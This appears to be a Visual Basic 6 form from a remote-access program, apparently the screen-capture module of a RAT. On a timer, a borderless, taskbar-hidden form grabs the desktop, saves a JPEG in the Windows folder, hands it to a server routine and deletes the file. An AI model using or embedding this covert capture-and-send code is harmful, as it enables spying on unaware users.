VERSION 5.00
Begin VB.Form frmSCRPreview 
   AutoRedraw      =   -1  'True
   BorderStyle     =   0  'None
   ClientHeight    =   3600
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4800
   LinkTopic       =   "Form1"
   ScaleHeight     =   240
   ScaleMode       =   0  'User
   ScaleWidth      =   320
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox Picture2 
      Height          =   1185
      Left            =   180
      ScaleHeight     =   1125
      ScaleWidth      =   2235
      TabIndex        =   1
      Top             =   3840
      Width           =   2295
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   30
      Top             =   30
   End
   Begin VB.PictureBox Picture1 
      Height          =   3600
      Left            =   150
      ScaleHeight     =   240
      ScaleMode       =   0  'User
      ScaleWidth      =   320
      TabIndex        =   0
      Top             =   120
      Width           =   4800
   End
End
Attribute VB_Name = "frmSCRPreview"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim windim As RECT, windim2 As RECT, ccd&, ccb&, lsb&
Dim IntervalSec, i As Integer

Private Sub CaptureScreen()
On Error Resume Next
Dim pPic As String

pPic = Get_WinPath & "preview.jpg"
Me.Cls
DoEvents

GetWindowRect GetDesktopWindow, windim
'create a device context of the screen
ndc = CreateDC("DISPLAY", vbNullString, vbNullString, ByVal 0&)
ccd& = CreateCompatibleDC(Me.hdc)
ccb& = CreateCompatibleBitmap(Me.hdc, windim.Right, windim.Bottom)
lsb& = SelectObject(ccd, ccb)
BitBlt ccd, 0, 0, windim.Right, windim.Bottom, ndc, 0, 0, vbSrcCopy
DoEvents
'delete context to free memory
DeleteDC ndc
Form_Resize
DoEvents
Call SavePicture(Picture1.Image, pPic)
DoEvents
Picture2.Picture = LoadPicture(pPic)
DoEvents
Call SavePic
DoEvents
Call frmServer.DownloadFile(pPic)
DoEvents
If FileExists(pPic) Then Kill pPic
DoEvents
Timer1.Enabled = True
End Sub

Private Sub SavePic()
Dim sI As String
Dim c As New cDIBSection

   Set c = New cDIBSection
   c.CreateFromPicture Picture2.Picture
   
   sI = Get_WinPath & "preview.jpg"
   If FileExists(sI) Then Kill sI
 
   Call SaveJPG(c, sI, 65)
End Sub

Private Sub Form_Resize()
On Error Resume Next
GetWindowRect Me.hwnd, windim2
pw = windim2.Right - windim2.Left
ph = windim2.Bottom - windim2.Top
With windim
 'get width & height of target
 sw = .Right - .Left
 sh = .Bottom - .Top
 'copies the picture from the screen to the picturebox if visible
 StretchBlt Me.hdc, 0, 0, pw, ph, ccd, 0, 0, sw, sh, vbSrcCopy
End With
Picture1.Picture = Me.Image
Me.Refresh
End Sub

Public Sub setInterval(Value As Integer)
  IntervalSec = Value
End Sub

Public Sub StartCapture()
  i = 0
  Timer1.Enabled = True
End Sub

Public Sub EndCapture()
  i = 0
  Timer1.Enabled = False
  DeleteObject ccb
  SelectObject ccd, lsb
  DeleteDC ccd
  Unload Me
End Sub

Private Sub Timer1_Timer()
  i = i + 1
  If i = IntervalSec Then
     Timer1.Enabled = False
     Call CaptureScreen
     i = 0
  End If
End Sub
